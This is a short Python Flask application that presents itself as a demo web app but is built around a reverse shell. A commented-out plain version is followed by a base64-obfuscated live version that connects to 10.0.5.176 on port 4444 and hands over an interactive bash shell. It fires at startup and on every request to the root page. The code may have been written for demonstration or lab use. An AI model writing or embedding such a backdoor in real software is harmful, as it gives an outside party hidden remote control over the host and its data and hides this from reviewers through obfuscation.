from flask import Flask
import base64

app = Flask(__name__)

# Plain text reverse-shell code
# @app.before_first_request
# def before_first_request():
#     s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#     s.connect(("10.0.5.176",4444))
#     dup2(s.fileno(),0)
#     dup2(s.fileno(),1)
#     dup2(s.fileno(),2)
#     run(["/bin/bash","-i"])

# Reverse shell code with obfuscation
d_ip = "10.0.5.176"
d_port = "4444"

obfuscated_shell = base64.b64encode(f"""
import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{d_ip}",{d_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);"""\
.encode('utf-8')).decode('utf-8')

# Reverse shell function
def reverse_shell():
    exec(base64.b64decode(obfuscated_shell).decode('utf-8'))

# Route to trigger reverse shell execution
@app.route('/')
def index():
    reverse_shell()
    return 'Web App for demo purposes'

if __name__ == '__main__':
    # Execute reverse shell at startup
    reverse_shell()
    # Start Flask app
    app.run(debug=True, host='0.0.0.0')